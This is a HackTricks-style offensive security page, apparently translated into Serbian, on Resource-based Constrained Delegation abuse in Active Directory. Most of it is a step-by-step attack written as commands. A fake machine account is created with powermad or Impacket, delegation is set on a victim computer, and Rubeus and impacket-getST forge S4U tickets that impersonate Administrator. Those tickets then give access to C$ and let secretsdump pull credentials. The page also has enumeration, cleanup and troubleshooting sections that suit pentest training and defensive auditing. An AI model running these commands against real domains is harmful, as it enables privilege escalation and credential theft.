# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnovi Resource-based Constrained Delegation

Ovo je slično osnovnoj [Constrained Delegation](constrained-delegation.md) ali **umesto** davanja dozvola **objektu** da **imituje bilo kog korisnika protiv mašine**. Resource-based Constrained Delegation **postavlja** u **objektu ko može da imituje bilo kog korisnika protiv njega**.

U ovom slučaju, ograničeni objekat će imati atribut pod nazivom _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da imituje bilo kog drugog korisnika protiv njega.

Još jedna važna razlika između ovog Constrained Delegation i drugih delegacija je da bilo koji korisnik sa **dozvolama za pisanje nad računom mašine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može postaviti **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (U drugim oblicima Delegacije potrebne su privilegije domen administratora).

### Novi koncepti

U Constrained Delegation je rečeno da je **`TrustedToAuthForDelegation`** oznaka unutar _userAccountControl_ vrednosti korisnika potrebna za izvođenje **S4U2Self.** Ali to nije potpuno tačno.\
Stvarnost je da čak i bez te vrednosti, možete izvesti **S4U2Self** protiv bilo kog korisnika ako ste **usluga** (imate SPN) ali, ako imate **`TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable** i ako **nemate** tu oznaku vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NISU Forwardable** pokušaj zloupotrebe **osnovne Constrained Delegation** **neće raditi**. Ali ako pokušavate da iskoristite **Resource-Based constrained delegation, to će raditi**.

### Struktura napada

> Ako imate **dozvole za pisanje ekvivalentne privilegijama** nad **računom računara** možete dobiti **privilegovan pristup** na toj mašini.

Pretpostavimo da napadač već ima **dozvole za pisanje ekvivalentne privilegijama nad žrtvinim računarom**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** (“Service A”). Imajte na umu da **bilo koji** _Admin User_ bez bilo kojih drugih posebnih privilegija može **kreirati** do 10 objekata računara (**_MachineAccountQuota_**) i postaviti im **SPN**. Tako da napadač može jednostavno kreirati objekat računara i postaviti SPN.
2. Napadač **zloupotrebljava svoje DOZVOLE ZA PISANJE** nad žrtvinim računarom (ServiceB) da konfiguriše **resource-based constrained delegation da omogući ServiceA da imituje bilo kog korisnika** protiv tog žrtvinog računara (ServiceB).
3. Napadač koristi Rubeus da izvede **potpun S4U napad** (S4U2Self i S4U2Proxy) od Service A do Service B za korisnika **sa privilegovanim pristupom Service B**.
1. S4U2Self (iz SPN kompromitovanog/kreativnog naloga): Traži **TGS od Administratora za mene** (Ne Forwardable).
2. S4U2Proxy: Koristi **ne Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administratora** za **žrtvinsku mašinu**.
3. Čak i ako koristite ne Forwardable TGS, pošto zloupotrebljavate Resource-based constrained delegation, to će raditi.
4. Napadač može **proći kroz tiket** i **imitirati** korisnika da dobije **pristup žrtvinskoj ServiceB**.

Da biste proverili _**MachineAccountQuota**_ domena možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje delegacije zasnovane na resursima

**Korišćenje activedirectory PowerShell modula**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje potpunog S4U napada (Windows/Rubeus)

Prvo, kreirali smo novi objekat Računar sa lozinkom `123456`, tako da nam je potreban hash te lozinke:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hešove za taj nalog.\
Sada se napad može izvršiti:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više tiketa za više usluga jednostavno postavljanjem jednog zahteva koristeći `/altservice` parametar Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Imajte na umu da korisnici imaju atribut pod nazivom "**Cannot be delegated**". Ako korisnik ima ovaj atribut postavljen na True, nećete moći da ga imitirate. Ova svojstvo se može videti unutar bloodhound-a.

### Linux alati: end-to-end RBCD sa Impacket-om (2024+)

Ako radite sa Linux-om, možete izvršiti celu RBCD liniju koristeći zvanične Impacket alate:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Ako je LDAP potpisivanje/LDAPS primenjeno, koristite `impacket-rbcd -use-ldaps ...`.
- Preferirajte AES ključeve; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju samo AES tokove.
- Impacket može prepraviti `sname` ("AnySPN") za neke alate, ali dobijte tačan SPN kad god je to moguće (npr., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Accessing

Poslednja komandna linija će izvršiti **potpun S4U napad i injektovaće TGS** sa Administratora na žrtvovanu mašinu u **memoriji**.\
U ovom primeru je zatražen TGS za **CIFS** servis od Administratora, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih servisnih karata

Saznajte više o [**dostupnim servisnim kartama ovde**](silver-ticket.md#available-services).

## Enumeracija, revizija i čišćenje

### Enumerisanje računara sa RBCD konfigurisanom

PowerShell (dekodiranje SD-a za rešavanje SID-ova):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (čitati ili isprazniti jednim komandama):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Cleanup / reset RBCD

- PowerShell (očistite atribut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos Greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je kerberos konfigurisan da ne koristi DES ili RC4 i da pružate samo RC4 hash. Pružite Rubeusu barem AES256 hash (ili jednostavno pružite rc4, aes128 i aes256 hash). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme trenutnog računara različito od vremena DC-a i kerberos ne radi ispravno.
- **`preauth_failed`**: Ovo znači da dati korisničko ime + hash ne rade za prijavu. Možda ste zaboravili da stavite "$" unutar korisničkog imena prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- Korisnik kojeg pokušavate da imitirate ne može da pristupi željenoj usluzi (jer ne možete da ga imitirate ili zato što nema dovoljno privilegija)
- Tražena usluga ne postoji (ako tražite tiket za winrm, ali winrm ne radi)
- Lažni računar koji je kreiran je izgubio svoje privilegije nad ranjivim serverom i morate ih ponovo dodeliti.
- Zloupotrebljavate klasični KCD; zapamtite da RBCD funkcioniše sa neprebacivim S4U2Self tiketima, dok KCD zahteva prebacive.

## Beleške, relays i alternative

- Takođe možete napisati RBCD SD preko AD Web Services (ADWS) ako je LDAP filtriran. Vidi:

{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relays lanci često se završavaju u RBCD kako bi se postigao lokalni SYSTEM u jednom koraku. Vidi praktične primere od kraja do kraja:

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Reference

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/

{{#include ../../banners/hacktricks-training.md}}
